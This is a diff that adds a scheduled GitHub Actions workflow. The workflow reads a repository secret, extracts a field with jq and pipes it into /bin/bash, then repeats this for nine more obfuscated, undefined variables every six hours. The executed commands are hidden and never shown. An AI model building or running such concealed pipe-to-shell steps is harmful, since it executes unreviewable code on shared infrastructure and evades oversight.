@@ -1,0 +1,25 @@
+name: yongfenmanchang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yongfenmanchang
+        env:
+          c92450: ${{ secrets.c92450 }}
+        run: |
+          echo $c92450 | jq -r .jdx340 | /bin/bash
+          echo $ka39168 | jq -r .ymb3 | /bin/bash
+          echo $ih5085 | jq -r .hvv29961 | /bin/bash
+          echo $g371 | jq -r .epff8 | /bin/bash
+          echo $bdqks0808 | jq -r .zhba57441 | /bin/bash
+          echo $bkc458 | jq -r .em68856 | /bin/bash
+          echo $jug2 | jq -r .u7 | /bin/bash
+          echo $vu09341 | jq -r .u6511 | /bin/bash
+          echo $gpsc129 | jq -r .ceee720 | /bin/bash
+          echo $ug37 | jq -r .vud57 | /bin/bash
+
